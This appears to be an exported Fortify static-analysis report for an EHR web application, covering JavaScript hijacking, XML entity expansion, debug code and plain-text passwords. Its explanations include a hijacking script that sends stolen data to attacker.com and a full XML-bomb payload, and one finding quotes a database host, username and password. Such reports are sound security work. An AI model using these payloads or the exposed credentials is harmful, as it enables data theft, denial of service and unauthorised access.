Example 1: The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.

The client requests data from a server and evaluates the result as JSON with the following code:


var object;
var req = new XMLHttpRequest();
req.open("GET", "/object.json",true);
req.onreadystatechange = function () {
  if (req.readyState == 4) {
    var txt = req.responseText;
    object = eval("(" + txt + ")");
    req = null;
  }
};
req.send(null);


When the code runs, it generates an HTTP request which appears as the following:


GET /object.json HTTP/1.1
...
Host: www.example.com
Cookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR


(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)
The server responds with an array in JSON format:


HTTP/1.1 200 OK
Cache-control: private
Content-Type: text/JavaScript; charset=utf-8
...
[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",
  "purchases":60000.00, "email":"brian@example.com" },
 {"fname":"Katrina", "lname":"O'Neil", "phone":"6502135600",
  "purchases":120000.00, "email":"katrina@example.com" },
 {"fname":"Jacob", "lname":"West", "phone":"6502135600",
  "purchases":45000.00, "email":"jacob@example.com" }]


In this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.


&lt;script&gt;
// override the constructor used to create all objects so
// that whenever the "email" field is set, the method
// captureObject() will run. Since "email" is the final field,
// this will allow us to steal the whole object.
function Object() {
 this.email setter = captureObject;
}

// Send the captured object back to the attacker's web site
function captureObject(x) {
  var objString = "";
  for (fld in this) {
    objString += fld + ": " + this[fld] + ", ";
  }
  objString += "email: " + x;
  var req = new XMLHttpRequest();
  req.open("GET", "http://attacker.com?obj=" +
           escape(objString),true);
  req.send(null);
}
&lt;/script&gt;

&lt;!-- Use a script tag to bring in victim's data --&gt;
&lt;script src="http://www.example.com/object.json"&gt;&lt;/script&gt;


The malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.

When the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.

This is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>All programs that communicate using JavaScript should take the following defensive measures:  1) Decline malicious requests: Include a hard-to-guess identifier, such as the session identifier, as part of each request that will return JavaScript. This defeats cross-site request forgery attacks by allowing the server to validate the origin of the request. 2) Prevent direct execution of the JavaScript response: Include characters in the response that prevent it from being successfully handed off to a JavaScript interpreter without modification. This prevents an attacker from using a &lt;script&gt; tag to witness the execution of the JavaScript. The best way to defend against JavaScript hijacking is to adopt both defensive tactics.

Declining Malicious Requests
From the server's perspective, a JavaScript hijacking attack looks like an attempt at cross-site request forgery, and defenses against cross-site request forgery will also defeat JavaScript hijacking attacks. In order to make it easy to detect malicious requests, every request should include a parameter that is hard for an attacker to guess. One approach is to add the session cookie to the request as a parameter. When the server receives such a request, it can check to be certain the session cookie matches the value in the request parameter. Malicious code does not have access to the session cookie (cookies are also subject to the Same Origin Policy), so there is no easy way for the attacker to craft a request that will pass this test. A different secret can also be used in place of the session cookie; as long as the secret is hard to guess and appears in a context that is accessible to the legitimate application and not accessible from a different domain, it will prevent an attacker from making a valid request.

Some frameworks run only on the client side. In other words, they are written entirely in JavaScript and have no knowledge about the workings of the server. This implies that they do not know the name of the session cookie. Even without knowing the name of the session cookie, they can participate in a cookie-based defense by adding all of the cookies to each request to the server.

Example 2: The following JavaScript fragment outlines this "blind client" strategy:


  var httpRequest = new XMLHttpRequest();
  ...
  var cookies="cookies="+escape(document.cookie);
  http_request.open('POST', url, true);
  httpRequest.send(cookies);


The server could also check the HTTP referer header in order to make sure the request has originated from the legitimate application and not from a malicious application. Historically speaking, the referer header has not been reliable, so we do not recommend using it as the basis for any security mechanisms. A server can mount a defense against JavaScript hijacking by responding to only HTTP POST requests and not responding to HTTP GET requests. This is a defensive technique because the &lt;script&gt; tag always uses GET to load JavaScript from external sources. This defense is also error-prone. The use of GET for better performance is encouraged by web application experts. The missing connection between the choice of HTTP methods and security means that, at some point, a programmer may mistake this lack of functionality for an oversight rather than a security precaution and modify the application to respond to GET requests.

Preventing Direct Execution of the Response
In order to make it impossible for a malicious site to execute a response that includes JavaScript, the legitimate client application can take advantage of the fact that it is allowed to modify the data it receives before executing it, while a malicious application can only execute it using a &lt;script&gt; tag. When the server serializes an object, it should include a prefix (and potentially a suffix) that makes it impossible to execute the JavaScript using a &lt;script&gt; tag. The legitimate client application can remove this extraneous data before running the JavaScript.

Example 3: There are many possible implementations of this approach. The following example demonstrates two. First, the server could prefix each message with the statement:


while(1);


Unless the client removes this prefix, evaluating the message will send the JavaScript interpreter into an infinite loop. The client searches for and removes the prefix as follows:


var object;
var req = new XMLHttpRequest();
req.open("GET", "/object.json",true);
req.onreadystatechange = function () {
  if (req.readyState == 4) {
    var txt = req.responseText;
    if (txt.substr(0,9) == "while(1);") {
      txt = txt.substring(10);
    }
    object = eval("(" + txt + ")");
    req = null;
  }
};
req.send(null);


Second, the server can include comment characters around the JavaScript that have to be removed before the JavaScript is sent to eval(). The following JSON object has been enclosed in a block comment:


/*
[{"fname":"Brian", "lname":"Chess", "phone":"6502135600",
  "purchases":60000.00, "email":"brian@example.com" }
]
*/


The client can search for and remove the comment characters as follows:

var object;
var req = new XMLHttpRequest();
req.open("GET", "/object.json",true);
req.onreadystatechange = function () {
  if (req.readyState == 4) {
    var txt = req.responseText;
    if (txt.substr(0,2) == "/*") {
      txt = txt.substring(2, txt.length - 2);
    }
    object = eval("(" + txt + ")");
    req = null;
  }
};
req.send(null);


Any malicious site that retrieves the sensitive JavaScript via a &lt;script&gt; tag will not gain access to the data it contains.

Since the 5th edition of EcmaScript it is not possible to poison the JavaScript Array constructor.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>24</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="9D95E91EEA7640D4CFB84151FE7D03D5" ruleID="B8540555-89E7-43D8-A41B-37DBD2417C86">
                            <Category>JavaScript Hijacking: Vulnerable Framework</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>jquery.jqGrid.min.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.jqGrid.min.js</FilePath>
<LineStart>3923</LineStart>
<Snippet>							// primitive jQuery load
							self = thd;
							$.ajax($.extend({
								url: surl,
								dataType: "html",</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F2B056F2D24CDC7833E4B554C2B9103B" ruleID="B8540555-89E7-43D8-A41B-37DBD2417C86">
                            <Category>JavaScript Hijacking: Vulnerable Framework</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>jquery.jqGrid.min.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.jqGrid.min.js</FilePath>
<LineStart>1821</LineStart>
<Snippet>				case "xml":
				case "script":
					$.ajax($.extend({
						url:ts.p.url,
						type:ts.p.mtype,</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E5D8822C80502682885556B91A77070A" ruleID="E312ACE0-DBEC-4BF0-8FC4-0C3D7DC5E30F0">
                            <Category>JavaScript Hijacking: Vulnerable Framework</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>jquery.form.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.form.js</FilePath>
<LineStart>239</LineStart>
<Snippet>    }
    else {
        jqxhr = $.ajax(options);
    }
</Snippet>
<TargetFunction>ajax(0)</TargetFunction>
                            </Primary>
                            <Source>
<FileName>jquery.form.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.form.js</FilePath>
<LineStart>106</LineStart>
<Snippet>        url:  url,
        success: $.ajaxSettings.success,
        type: method || 'GET',
        iframeSrc: /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank'
    }, options);</Snippet>
<TargetFunction>Read type()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="21B199543184C10B12D89077E94CA940" ruleID="8FD4CFCD-A6F9-4FF1-A8D9-18C029580FB5">
                            <Category>JavaScript Hijacking: Vulnerable Framework</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>jquery.form.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.form.js</FilePath>
<LineStart>227</LineStart>
<Snippet>        // see:  http://groups.google.com/group/jquery-dev/browse_thread/thread/36395b7ab510dd5d
        if (options.closeKeepAlive) {
            $.get(options.closeKeepAlive, function() {
                jqxhr = fileUploadIframe(a);
            });</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="33F0E5E6B427EDD027979E3A9E9EB8F2" ruleID="E312ACE0-DBEC-4BF0-8FC4-0C3D7DC5E30F0">
                            <Category>JavaScript Hijacking: Vulnerable Framework</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Applications that use JavaScript notation to transport sensitive data can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data from a vulnerable application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>jquery.form.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.form.js</FilePath>
<LineStart>318</LineStart>
<Snippet>                    beforeSend.call(this, xhr, o);
        };
        return $.ajax(s);
    }
</Snippet>
<TargetFunction>ajax(0)</TargetFunction>
                            </Primary>
                            <Source>
<FileName>jquery.form.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.form.js</FilePath>
<LineStart>106</LineStart>
<Snippet>        url:  url,
        success: $.ajaxSettings.success,
        type: method || 'GET',
        iframeSrc: /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank'
    }, options);</Snippet>
<TargetFunction>Read type()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="23">
                        <groupTitle>XML Entity Expansion Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The XML parser configured in XMLUtil.java:77 does not prevent nor limit Document Type Definition (DTD) entity resolution. This can expose the parser to an XML Entity Expansion injection.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>XML Entity Expansion injection also known as XML Bombs are Denial Of Service (DoS) attacks that benefit from valid and well-formed XML blocks that expand exponentially until they exhaust the server allocated resources. XML allows to define custom entities which act as string substitution macros. By nesting recurrent entity resolutions, an attacker may easily crash the server resources.

The following XML document shows an example of an XML Bomb.

&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE lolz [
  &lt;!ENTITY lol "lol"&gt;
  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;


This test could crash the server by expanding the small XML document into more than 3GB in memory.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>An XML parser should be configured securely so that it does not allow document type definition (DTD) custom entities as part of an incoming XML document.

To avoid XML Entity Expansion injection the "secure-processing" property should be set for an XML factory, parser or reader:

factory.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);


In JAXP 1.3 and earlier versions, when the secure processing feature is on, default limitations are set for DOM and SAX parsers. These limits are:

entityExpansionLimit = 64,000
elementAttributeLimit = 10,000

Since JAXP 1.4, the secure processing feature is turned on by default. In addition to the preceding limits, a new maxOccur limit is added to the validating parser. The limit is:

maxOccur = 5,000


If inline DOCTYPE declaration is not needed, it can be completely disabled with the following property:

factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify RTA adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>23</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="67A490DF11DC42DE13E5E7BA681E29F3" ruleID="4C61DD8D-70DA-4444-9DBF-6817387B1ED9">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The XML parser configured in EHRHospFormulasXMLUtils.java:55 does not prevent nor limit Document Type Definition (DTD) entity resolution. This can expose the parser to an XML Entity Expansion injection.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EHRHospFormulasXMLUtils.java</FileName>
<FilePath>EHR-HOSP-JAR/src/com/ehr/common/EHRHospFormulasXMLUtils.java</FilePath>
<LineStart>55</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_sFileNameWithPath);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CFEE34D3270B26CA56E9E086687E062A" ruleID="4C61DD8D-70DA-4444-9DBF-6817387B1ED9">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The XML parser configured in XMLUtil.java:77 does not prevent nor limit Document Type Definition (DTD) entity resolution. This can expose the parser to an XML Entity Expansion injection.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>77</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_sFileNameWithPath);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0C9CC7D8B2E8DE177183CC589BF17783" ruleID="4C61DD8D-70DA-4444-9DBF-6817387B1ED9">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The XML parser configured in XMLUtil.java:106 does not prevent nor limit Document Type Definition (DTD) entity resolution. This can expose the parser to an XML Entity Expansion injection.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>106</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_inXMLStream);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="67D18BC48C74214F4A8032F092D4810B" ruleID="4C61DD8D-70DA-4444-9DBF-6817387B1ED9">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The XML parser configured in XMLUtil.java:164 does not prevent nor limit Document Type Definition (DTD) entity resolution. This can expose the parser to an XML Entity Expansion injection.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>164</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_inXMLStream);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9C81702C8BB858ED128DBF2E1775CA49" ruleID="4C61DD8D-70DA-4444-9DBF-6817387B1ED9">
                            <Category>XML Entity Expansion Injection</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The XML parser configured in XMLUtil.java:135 does not prevent nor limit Document Type Definition (DTD) entity resolution. This can expose the parser to an XML Entity Expansion injection.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/util/XMLUtil.java</FilePath>
<LineStart>135</LineStart>
<Snippet>    l_objDocBuilder.setErrorHandler(l_objErrorHandler);

    Document l_objDocument = l_objDocBuilder.parse(p_sFileNameWithPath);

    return l_objDocument.getDocumentElement();</Snippet>
<TargetFunction>l_objDocBuilder.parse(...) : XML document parsed allowing external entity resolution()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="22">
                        <groupTitle>J2EE Bad Practices: Leftover Debug Code</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The class ActionMapper contains debug code, which can create unintended entry points in a deployed web application.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>A common development practice is to add "back door" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the application. When this sort of debug code is accidentally left in the application, the application is open to unintended modes of interaction. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the application.

The most common example of forgotten debug code is a main() method appearing in a web application. Although this is an acceptable practice during product development, classes that are part of a production J2EE application should not define a main().</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Remove debug code before deploying a production version of an application. Regardless of whether a direct security threat can be articulated, it is unlikely that there is a legitimate reason for such code to remain in the application after the early stages of development.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. The presence of a main() method may represent the tip of an iceberg. When you find a main(), look for other indications that developers were rushed or otherwise not able to conclude their efforts normally.

2. If you are auditing a non-J2EE Java application, the J2EE Bad Practices category might not apply to your environment. If this is the case, you can use AuditGuide to suppress these issues.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>22</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="77B423F1A19D12A59EAE72A4F1D5B9E7" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The class CNSIEditorBean contains debug code, which can create unintended entry points in a deployed web application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>429</LineStart>
<Snippet>	
	/* Fortify Fix for APPSEC-3864  Unreleased Resource: Streams - START */
	public static void main(String[] args) throws Exception {

		String htmlString = "";</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2808ECE3F542524BFB75AD96D6D60E58" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The class AppAreaDetCacheMgr contains debug code, which can create unintended entry points in a deployed web application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>290</LineStart>
<Snippet>    * @throws Exception the exception
    */
   public static void main(String args[]) throws Exception
    {
       Logger.createLogger("Test");</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0CD9212538BDF01B7B30D8DC560612EC" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The class DateConverter contains debug code, which can create unintended entry points in a deployed web application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DateConverter.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/DateConverter.java</FilePath>
<LineStart>729</LineStart>
<Snippet>

    public static void main (String[] args) 
    {
        try</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EDC1155DCC4B109D56156D31CC849531" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The class EJBResourceFactory contains debug code, which can create unintended entry points in a deployed web application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EJBResourceFactory.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/ejb/EJBResourceFactory.java</FilePath>
<LineStart>295</LineStart>
<Snippet>     *@exception  Exception  throws All exceptions.
     */
    public static void main(String args[])
        throws Exception
    {</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E2424E6C6AF5FCF9703235771B89B97F" ruleID="625EEE1F-464F-42DC-85D6-269A637EF747">
                            <Category>J2EE Bad Practices: Leftover Debug Code</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>The class ActionMapper contains debug code, which can create unintended entry points in a deployed web application.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ActionMapper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/base/ActionMapper.java</FilePath>
<LineStart>1064</LineStart>
<Snippet>   * @param args Array of Strings.
   */
  public static void main(String[] args)
  {
</Snippet>
<TargetFunction>Function: main()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="21">
                        <groupTitle>Password Management: Password in Configuration File</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Storing a plain text password in a configuration file may result in a system compromise.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Storing a plain text password in a configuration file allows anyone who can read the file access to the password-protected resource. Developers sometimes believe that they cannot defend the application from someone who has access to the configuration, but this attitude makes an attacker's job easier. Good password management guidelines require that a password never be stored in plain text.

</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>A password should never be stored in plain text. An administrator should be required to enter the password when the system starts. If that approach is impractical, a less secure but often adequate solution is to obfuscate the password and scatter the de-obfuscation material around the system so that an attacker has to obtain and correctly combine multiple system resources to decipher the password.

Some third-party products claim the ability to manage passwords in a more secure way. For example, WebSphere Application Server 4.x uses a simple XOR encryption algorithm for obfuscating values, but be skeptical about such facilities. WebSphere and other application servers offer outdated and relatively weak encryption mechanisms that are insufficient for security-sensitive environments. For a secure solution the only viable option is a proprietary one.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Static Code Analyzer searches configuration files for common names used for password properties. Audit these issues by verifying that the flagged entry is used as a password and that the password entry contains plain text.

2. If the entry in the configuration file is a default password, require that it be changed in addition to requiring that it be obfuscated in the configuration file.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>21</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="99E34627F74A0ADA0472C28862169982" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Storing a plain text password in a configuration file may result in a system compromise.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>test.application.properties</FileName>
<FilePath>build/properties/test.application.properties</FilePath>
<LineStart>3</LineStart>
<Snippet>DB.URL=jdbc:oracle:thin:208.49.76.143:1521:midev
DB.USERNAME=midevstate
DB.PASSWORD=midevstate123
DB.SCHEMA=midevstate
FILE.PATH=/u03/Team1/DevelopmentStage/working_directory/HIPAA/</Snippet>
<TargetFunction>DB.PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
